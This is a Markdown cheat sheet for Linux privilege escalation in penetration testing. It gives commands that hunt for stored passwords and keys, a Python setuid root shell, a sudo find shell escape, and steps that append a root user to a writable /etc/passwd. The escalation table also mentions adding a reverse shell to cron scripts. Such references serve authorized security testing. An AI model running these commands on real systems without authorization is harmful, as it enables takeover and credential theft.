# Linux privilege escalation

> Authorized use only. Enumerate first; escalate on evidence, not guesses.
> Automated: `linpeas.sh`, `pspy` (process spy, no root). Reference: GTFOBins.

## Enumerate

```bash
id; sudo -l                         # who am I, what can I sudo
uname -a; cat /etc/os-release       # kernel / distro (kernel exploits last resort)
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
getcap -r / 2>/dev/null                          # file capabilities
cat /etc/crontab; ls -la /etc/cron.*             # scheduled jobs
find / -writable -type d 2>/dev/null             # writable dirs
grep -rniE 'password|passwd|secret|api[_-]?key' /home /var/www 2>/dev/null
env; cat ~/.bash_history 2>/dev/null             # leaked creds / context
```

## Common wins

| Vector | Check | Escalate |
|--------|-------|----------|
| `sudo -l` entries | a binary you can run as root | [GTFOBins](https://gtfobins.github.io/) → `sudo` section |
| SUID binary | in the `find -perm -4000` list | GTFOBins → `SUID` section |
| Capabilities | `cap_setuid` on python/perl | `./python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
| Writable cron/script | root runs a script you can edit | append a reverse shell / `chmod +s /bin/bash` |
| Writable `/etc/passwd` | file is writable | add a root user with a known hash |
| `$PATH` hijack | SUID calls a binary by name | drop a malicious binary earlier in `$PATH` |
| NFS `no_root_squash` | `showmount -e <host>` | mount, drop a root SUID shell from your box |

## Sudo / SUID via GTFOBins (pattern)

```bash
sudo -l                         # e.g. (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit      # GTFOBins one-liner for find
```

## Writable /etc/passwd

```bash
openssl passwd -1 -salt x pass123        # -> $1$x$...
echo 'r00t:$1$x$...:0:0::/root:/bin/bash' >> /etc/passwd; su r00t
```

Kernel exploits (Dirty Pipe/COW, pwnkit) are the **last** resort — verify version first and prefer patched, low-risk paths.
